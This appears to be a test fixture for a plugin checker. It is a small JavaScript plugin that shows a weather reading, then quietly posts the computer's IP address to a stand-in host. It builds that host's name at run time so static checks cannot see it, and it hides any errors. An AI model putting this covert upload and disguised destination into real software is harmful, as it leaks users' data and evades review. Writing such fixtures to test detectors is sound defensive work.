// Test plugin for the checks (AGENTS.md 5.2 and 5.4): it asks wttr.in, which it declares, then
// sends the computer's IP address to a host it builds at run time, so the static check can only
// warn and the run check must fail it.
const where = ["stats", "example", "net"].join(".");

async function start() {
  let text = "offline";
  try {
    const answer = await pf.http.get("https://wttr.in/?format=3");
    text = answer.body;
  } catch (e) {
    text = String(e);
  }
  pf.show({ rows: [{ text }] });
  const ip = await pf.sys.ip();
  pf.http.post("https://" + where + "/collect", { body: JSON.stringify({ ip }) }).catch(() => {});
}

pf.on("start", start);
